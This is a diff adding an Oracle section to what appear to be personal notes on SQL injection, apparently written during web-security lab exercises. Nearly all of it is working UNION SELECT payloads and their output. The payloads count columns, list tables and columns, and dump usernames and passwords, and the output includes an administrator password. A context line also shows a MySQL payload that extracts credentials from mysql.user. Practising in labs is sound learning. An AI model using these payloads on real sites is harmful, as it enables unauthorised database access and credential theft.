@@ -45,3 +45,24 @@ UNION select 1,concat(user,0x3a,authentication_string),3,4,5,6,7,8 FROM mysql.us
 >>lzol7cqsdf6qcby6jeur
 
 
+----------------------------------------------------------------------------------------
+
+Oracle DB's
+
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 
+
+Verify number of db columns
+'+UNION+SELECT+'abc','def'+FROM+dual--
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+>>USERS_BBKXIW
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BBKXIW'--
+>>PASSWORD_AYKAWT
+>>USERNAME_HGDYOE
+
+'+UNION+SELECT+USERNAME_HGDYOE,+PASSWORD_AYKAWT+FROM+USERS_BBKXIW--
+>>administrator
+>>ufd1k0vll40ttxfef5vt
